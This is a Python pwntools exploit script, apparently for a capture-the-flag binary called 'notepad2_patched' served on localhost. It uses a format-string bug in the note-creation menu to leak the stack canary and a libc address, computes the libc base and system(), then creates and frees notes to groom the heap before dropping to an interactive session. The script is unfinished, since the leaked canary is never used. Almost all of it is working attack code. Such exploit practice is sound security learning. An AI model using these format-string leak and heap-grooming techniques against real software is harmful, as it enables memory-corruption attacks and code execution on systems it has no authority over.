from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./notepad2_patched")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

def create_note(index, content):
    io.sendlineafter("> ", b"1")
    io.sendlineafter("> ", str(index).encode())
    io.sendlineafter("> ", content)

def view_note(index):
    io.sendlineafter("> ", b"2")
    io.sendlineafter("> ", str(index).encode())
    return io.recvline().strip()

def leak_memory(index_fm, index):
    create_note(index, f"%{index_fm}$p".encode())
    return view_note(index).decode()
    
def remove_note(index):
    io.sendlineafter("> ", b"3")
    io.sendlineafter("> ", str(index).encode())

def fuzzing():
    for i in range(1, 300):
        create_note(0, f"AAAAAAAA.%{i}$p".encode())
        print(f"{i} =>", view_note(0).decode())
        remove_note(0)

context.terminal = ['gnome-terminal', '-e']
io = start()

# Canary
# print(leak_memory(7, 0))

# Stack Base
# print(leak_memory(8, 0)) - 123600

# Libc -> __libc_start_call_main+128
# print(leak_memory(13, 0))


create_note(0, f"%7$p.%13$p".encode())
leaked = view_note(0).decode().split('.')

canary = int(leaked[0], 16)
leak_libc = int(leaked[1], 16)

libc.address = (leak_libc - 128) - libc.sym.__libc_start_call_main

print(f"System: {hex(libc.sym.system)}")

remove_note(0)


for i in range(0, 9):
    create_note(i, b"AAAAAAAAAAAAAAAA")

#for i in range(7, -1, -1):
#    remove_note(i)

for i in range(3, 9):
    remove_note(i)

remove_note(1)
remove_note(0)
remove_note(2)

create_note(0, b"BBBBB")
create_note(1, b"CCCCC")
create_note(2, b"DDDDDDDDDDD")

io.interactive()
